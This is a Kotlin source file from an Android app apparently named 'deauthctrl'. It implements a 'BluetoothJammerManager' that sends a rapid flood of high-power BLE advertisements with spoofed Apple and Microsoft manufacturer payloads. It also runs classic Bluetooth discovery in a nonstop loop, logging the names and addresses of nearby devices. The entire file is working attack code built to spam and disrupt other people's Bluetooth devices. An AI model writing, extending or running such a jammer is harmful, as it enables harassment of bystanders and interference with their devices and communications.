package xin.ctkqiang.deauthctrl.manager

import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothDevice
import android.bluetooth.BluetoothManager
import android.bluetooth.le.AdvertiseCallback
import android.bluetooth.le.AdvertiseData
import android.bluetooth.le.AdvertiseSettings
import android.bluetooth.le.BluetoothLeAdvertiser
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import xin.ctkqiang.deauthctrl.model.JammerLogEntry

data class DiscoveredDevice(val name: String, val address: String, val type: String)

class BluetoothJammerManager(private val context: Context) {

    private val btManager = context.getSystemService(Context.BLUETOOTH_SERVICE) as BluetoothManager
    private val adapter: BluetoothAdapter? = btManager.adapter
    private val scope = CoroutineScope(Dispatchers.Default + SupervisorJob())

    private val _isRunning = MutableStateFlow(false)
    val isRunning: StateFlow<Boolean> = _isRunning.asStateFlow()
    private val _devices = MutableStateFlow<List<DiscoveredDevice>>(emptyList())
    val discoveredDevices: StateFlow<List<DiscoveredDevice>> = _devices.asStateFlow()
    private val _discoveryCount = MutableStateFlow(0)
    val discoveryCount: StateFlow<Int> = _discoveryCount.asStateFlow()
    private val _log = MutableStateFlow<List<JammerLogEntry>>(emptyList())
    val log: StateFlow<List<JammerLogEntry>> = _log.asStateFlow()
    private val _error = MutableStateFlow<String?>(null)
    val error: StateFlow<String?> = _error.asStateFlow()

    private var bleAdvertiser: BluetoothLeAdvertiser? = null
    private var jammerJob: Job? = null
    private var blePkt = 0; private var inqPkt = 0
    private val discoveredMap = mutableMapOf<String, DiscoveredDevice>()
    private var inquiryReceiver: BroadcastReceiver? = null
    private var activeAdv: BluetoothLeAdvertiser? = null
    private var activeCb: AdvertiseCallback? = null

    fun start() {
        if (_isRunning.value) return
        val bt = adapter ?: run { _error.value = "no bluetooth"; return }
        if (!bt.isEnabled) { _error.value = "bluetooth is off"; return }
        bleAdvertiser = bt.bluetoothLeAdvertiser
        _isRunning.value = true; _error.value = null; blePkt = 0; inqPkt = 0; discoveredMap.clear()

        jammerJob = scope.launch {
            launch { bleFlood() }
            launch { inquiryFlood() }
        }
        log("JAMMER", "full-spectrum BT jammer activated")
    }

    fun stop() {
        _isRunning.value = false; jammerJob?.cancel()
        try { activeAdv?.stopAdvertising(activeCb!!) } catch (_: Exception) {}
        try { context.unregisterReceiver(inquiryReceiver) } catch (_: Exception) {}
        activeAdv = null; activeCb = null; inquiryReceiver = null; bleAdvertiser = null
        log("JAMMER", "stopped | BLE=$blePkt Inquiry=$inqPkt devices=${discoveredMap.size}")
    }

    fun destroy() { stop(); scope.cancel() }
    fun clearLog() { _log.value = emptyList(); blePkt = 0; inqPkt = 0; discoveredMap.clear(); _devices.value = emptyList(); _discoveryCount.value = 0 }

    private suspend fun bleFlood() {
        val adv = bleAdvertiser ?: return
        val settings = AdvertiseSettings.Builder()
            .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
            .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
            .setConnectable(false).build()

        val payloads = listOf(
            byteArrayOf(0x4C, 0x00, 0x05, 0x02) + rand(17),
            byteArrayOf(0x4C, 0x00, 0x07, 0x02) + rand(17),
            byteArrayOf(0x4C, 0x00, 0x0B, 0x02) + rand(17),
            byteArrayOf(0x06, 0x00, 0x01, 0x03) + rand(12),
            byteArrayOf(0x75, 0x00, 0x01, 0x00) + rand(12),
            byteArrayOf(0xFF.toByte(), 0xFF.toByte()) + rand(20),
        )

        while (_isRunning.value) {
            for (p in payloads) {
                if (!_isRunning.value) break
                try { activeAdv?.stopAdvertising(activeCb!!) } catch (_: Exception) {}
                val data = AdvertiseData.Builder().addManufacturerData(0xFFFF, p).setIncludeDeviceName(false).build()
                val cb = object : AdvertiseCallback() {
                    override fun onStartSuccess(s: AdvertiseSettings?) { blePkt++ }
                    override fun onStartFailure(c: Int) {}
                }
                try { adv.startAdvertising(settings, data, cb); activeAdv = adv; activeCb = cb } catch (_: Exception) {}
                delay(25)
            }
        }
    }

    private suspend fun inquiryFlood() {
        try {
            inquiryReceiver = object : BroadcastReceiver() {
                override fun onReceive(ctx: Context?, intent: Intent?) {
                    if (BluetoothDevice.ACTION_FOUND == intent?.action) {
                        inqPkt++
                        val dev = intent.getParcelableExtra<BluetoothDevice>(BluetoothDevice.EXTRA_DEVICE) ?: return
                        val name = dev.name ?: "Unknown"
                        discoveredMap[dev.address] = DiscoveredDevice(name, dev.address, "Classic")
                        _devices.value = discoveredMap.values.toList()
                        _discoveryCount.value = discoveredMap.size
                    }
                }
            }
            context.registerReceiver(inquiryReceiver, IntentFilter(BluetoothDevice.ACTION_FOUND))
        } catch (_: Exception) {}

        while (_isRunning.value) {
            try { adapter?.startDiscovery() } catch (_: Exception) {}
            delay(1500)
            try { adapter?.cancelDiscovery() } catch (_: Exception) {}
            delay(100)
        }
        try { context.unregisterReceiver(inquiryReceiver) } catch (_: Exception) {}
    }

    private fun rand(c: Int) = ByteArray(c).also { kotlin.random.Random.nextBytes(it) }
    private fun log(module: String, msg: String) { _log.value = (_log.value + JammerLogEntry(module = module, message = msg)).takeLast(200) }
}
